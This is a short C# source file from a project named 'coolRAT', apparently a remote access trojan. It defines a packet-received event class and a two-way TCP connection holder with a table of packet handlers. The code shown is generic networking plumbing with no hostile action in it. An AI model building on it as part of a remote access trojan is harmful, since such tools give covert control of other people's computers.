using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Connections
{
    public class PacketReceivedEventArgs : EventArgs
    {
        Packet Packet;

        public PacketReceivedEventArgs(Packet packet)
        {
            Packet = packet;
        }
    }
    public class DualTcpConnection
    {
        public TcpConnection IncomingConnection;
        public TcpConnection OutgoingConnection;

        public delegate void PacketReceivedHandler(object sender, PacketReceivedEventArgs e);
        public Dictionary<string, PacketReceivedHandler> PacketReceiverSubscriptions;

        public DualTcpConnection(TcpConnection incomingConnection, TcpConnection outgoingConnection, Dictionary<string, PacketReceivedHandler> packetReceiverSubscriptions)
        {
            IncomingConnection = incomingConnection;
            OutgoingConnection = outgoingConnection;
            PacketReceiverSubscriptions = packetReceiverSubscriptions;
        }

        public DualTcpConnection()
        {
            PacketReceiverSubscriptions = new Dictionary<string, PacketReceivedHandler>();
        }
    }
}
